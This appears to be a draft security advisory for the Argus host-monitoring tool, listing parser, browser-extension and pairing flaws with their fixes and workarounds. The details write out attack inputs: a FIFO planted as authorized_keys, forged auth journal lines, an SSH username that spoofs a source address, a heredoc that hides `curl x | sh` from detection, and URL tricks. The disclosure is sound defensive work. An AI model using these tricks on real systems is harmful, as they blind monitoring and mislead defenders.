# ARGUS-2026-002 (DRAFT, not published): protocols, browser extension and untrusted-input parsers

Status: **draft for owner review; publish nowhere.** Prepared 2026-10-30 on branch
`sec/protocols-parsers`.

## Background

From 2026-10-22 to 2026-10-29 the Windows downloads (`argus-windows-x64.zip`,
`Argus-Setup.exe`) of Argus 2026.10.22, 2026.10.25, 2026.10.29 and 2026.10.30 shipped
readable source. The Linux tarballs of 2026.10.22 and 2026.10.25 did too. No secrets were
in it. This advisory covers what an attacker reading that source could use against the
phone notification relay, the Veil browser extension, and the daemon's parsers of
attacker-influenced input. It is one of several advisories from the same review.

**Fixed in:** the first signed release after 2026-10-30. The hosted relay is unchanged
in this advisory: there is no relay code fix to deploy, but the protocol limits below
remain open.

## Summary

| ID | Severity | Component | Attacker | Affected | Status |
|---|---|---|---|---|---|
| U-1 | High | SSH key watch | any local user | 2026.10.29, 2026.10.30 | fixed |
| U-2 | High | application-code scanner | local user who can write under a scanned root | 2026.10.29, 2026.10.30 | fixed |
| U-3 | High | application-code scanner | author of any repository on a scanned server | 2026.10.29, 2026.10.30 | fixed |
| U-4 | Medium | secrets and application-code scanners | anyone who can place a file in a scanned folder (e.g. a download) | all four | fixed |
| U-5 | Medium | SSH brute-force detection | remote SSH client | all four | fixed |
| U-6 | Medium | SSH brute-force detection (journal) | any local user | all four | fixed (journal); flat auth.log fallback still open |
| U-7 | Medium | Linux Sysmon download-and-run rule | anyone who can run a command | all four | fixed for listed shells and interpreters |
| E-1 | Medium | Veil browser extension | any web page | all four | fixed (reload the extension) |
| P-1 | Medium (design) | notify relay | relay operator or anyone controlling its deployment | 2026.10.29, 2026.10.30 | documented, open |
| P-2 | Medium (design) | notify pairing | a relay that rewrites API traffic | 2026.10.29, 2026.10.30 | documented, open |
| U-8 | Low | OSV advisory ingestion | the OSV feed, or anyone who can impersonate it over TLS | 2026.10.29, 2026.10.30 | fixed |
| P-3 | Low | notify client | whoever edits the alert config | 2026.10.29, 2026.10.30 | fixed |
| P-4 | Low | `notify pair` | whoever claims the pairing code (in practice the relay) | 2026.10.29, 2026.10.30 | fixed |
| P-5 | Low | `notify revoke` | none (operator error) | 2026.10.29, 2026.10.30 | fixed |
| U-9 | Low | secret fingerprints | anyone who obtains findings | all four | open |

## Details

**U-1. A FIFO as `authorized_keys` stalls the daemon.** Any local user can run
`mkfifo ~/.ssh/authorized_keys`. The root SSH key scan then blocks forever in `open()` on
the main lane. The watchdog restarts the daemon after the 600 s stall limit, and the next
scan hangs it again. Every main-lane collector goes blind. In addition, splitting the key
options was quadratic in the number of commas.
*Fix:* files are read through a new non-blocking, type-checked, bounded reader
(`core/safeio.py`), and the options are split in a single pass.

**U-2. Swapping a file after the scanner's type check.** The repository walk checks with
`lstat` that each file is regular. The readers then reopened it by path and followed
links. In that window, someone who can write under a scanned root (default roots include
`/home`) can swap the file for one of three things:
- a FIFO, which blocks the bulk lane, and with it every later bulk job, with nothing to
  report it;
- a link to `/dev/zero`, which causes an uncapped read until the daemon runs out of
  memory;
- a link to a root-only file, whose secret kind, line number and fingerprint (never its
  contents) then reach findings.

*Fix:* type and size are judged on the open descriptor, and appcode refuses links when it
opens the file.

**U-3. One lockfile aborts the whole scan.** A `package-lock.json` (or a
`Cargo.lock`/`composer.lock`) nested beyond the parser's depth raised `RecursionError` out
of the audit. Every daily run then failed for every project on the host for as long as
the file existed. *Fix:* the file counts as unparseable.

**U-4. Quadratic private-key scan.** A file of `-----BEGIN PRIVATE KEY-----` lines with no
END line took about 13 s at 224 KB and 43 s at 448 KB. At the secrets job's 2 MB cap
(it scans `~/Downloads`), the audit estimated about 950 s on the main lane, enough to
trigger the watchdog. *Fix:* a linear scan, checked against the old regex on random
inputs.

**U-5. The SSH username chose the blamed address.** A client that logs in as
`admin from 192.0.2.10` produces
`Failed password for invalid user admin from 192.0.2.10 from <real> port N ssh2`. The
unanchored pattern credited 192.0.2.10. That hid the real source, and the advice to
block the source then pointed at an innocent address. *Fix:* the address is taken from
sshd's own trailing ` from IP port N`.

**U-6. Forged authpriv journal lines.** Any local user could write
`logger -p authpriv.notice "Failed password ..."` and invent a brute force from any
address. *Fix:* the journal is read as JSON, and only entries that journald stamps
`_UID=0` count. Lines from other writers are not counted, but their number is reported
as a low finding so an unprivileged sshd is not made invisible. The flat
`/var/log/auth.log` fallback cannot tell writers apart and stays open.

**U-7. Quoted heredoc bypass.** `bash <<'E'` followed by `curl x | sh` and `E` executes,
but the quoted-heredoc exemption (meant for `cat > file <<'EOF'`) removed the body before
the download-and-run rule ran. *Fix:* the exemption does not apply when the heredoc's
line names a shell or interpreter. That list is not exhaustive: an unlisted interpreter
still evades the rule.

**E-1. Veil: any web page could report under another site's name.** `content.js`
forwarded whatever a page posted on the `jarvis-veil` channel. A page could therefore set
`top_origin` to any site (findings attributed to, say, a bank) and attach arbitrary
fields. The daemon's schema check limited the fields stored, but not the attribution.
*Fix:* the origin comes from the isolated world's own `location`, and only the probe's
fields pass. Page-forged counters for the page's own origin remain possible by design:
the probe runs in the page's world.

**P-1. The relay serves the phone app.** The PWA is served from the relay's own
deployment. Whoever can change that deployment can ship app code that:
- uses the phone's keys to decrypt alerts (the keys are non-extractable but usable by
  any code running in the app);
- shows the owner the same 6-digit code the server shows, which pairs an attacker
  device.

Invariants N2 ("the relay cannot read") and N3 ("cannot impersonate") hold only against
tampering with API traffic. `docs/architecture/ARGUS-NOTIFY.md` now says so. *Open:*
closing this needs app code delivered independently of the relay, as a signed bundle or
a native app.

**P-2. The pairing comparison has no commitment.** A relay that rewrites only API
traffic sees the phone's keys before it has to present device keys to the server. It
can then grind an X25519 key whose 6-digit code matches (about 10^6 tries). *Open:* this
needs a commit-then-reveal server nonce in the comparison, which changes the server, the
relay and the PWA together. On its own it does not help while P-1 stands.

**U-8.** One malformed OSV advisory (nested JSON, or a list where an object belongs)
failed the whole ecosystem refresh. It is now skipped.

**P-3.** `notify_url` was checked by prefix, so `http://127.0.0.1.example.net` and
`http://127.0.0.1@host` passed as the local test relay over plain HTTP. The parsed host
is now checked. Envelopes are sealed and signed regardless.

**P-4.** The claimed phone name was printed raw just before the 6-digit code. Terminal
escape sequences in it could hide the real code or show a fake one. The name is now
reduced to printable characters.

**P-5.** `notify revoke` with an empty or ambiguous prefix revoked every match locally but
told the relay about only one. It now revokes only on a unique match.

**U-9.** Secret fingerprints are an unsalted 48-bit SHA-256 prefix. Low-entropy values
can be recovered offline by anyone who obtains the findings. *Open:* a per-install key
needs migration of stored fingerprints.

## Workarounds until the fixed release

- **U-1 and U-2:** on multi-user servers, restrict `appcode` roots to trusted directories
  and check for FIFOs under home folders: `find /home -name authorized_keys\* -type p`.
  The watchdog restarts are visible in the service journal.
- **U-3:** a scan that fails every day with an error, instead of reporting clean, points
  to this. Look for very deeply nested lockfiles.
- **U-5 and U-6:** treat source addresses in SSH brute-force findings as unverified. Read
  them from `journalctl _COMM=sshd` before blocking anything.
- **E-1:** treat `privacy-veil` findings as claims made by the page itself. To stop
  reporting, clear the pairing token in the extension options.
- **P-1 and P-2:** treat the relay deployment as trusted code. Pair only from a phone and
  network you control, and remove unknown devices with `notify devices` and
  `notify revoke`.

## Credits

Internal review after the source exposure.
